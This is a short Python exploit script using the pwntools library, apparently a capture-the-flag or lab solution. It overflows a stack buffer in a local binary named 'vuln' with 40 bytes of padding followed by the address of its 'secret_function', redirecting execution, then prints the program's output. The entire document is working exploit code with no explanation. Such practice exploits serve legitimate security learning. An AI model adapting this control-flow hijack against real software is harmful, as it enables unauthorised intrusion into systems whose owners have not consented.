from pwn import *

exe = ELF("../vuln")
context.binary = exe

payload = b'A' * 40 + p64(exe.symbols.secret_function)

p = process('../vuln')
p.sendlineafter(b'text:\n', payload)

print(p.clean().decode())
p.close()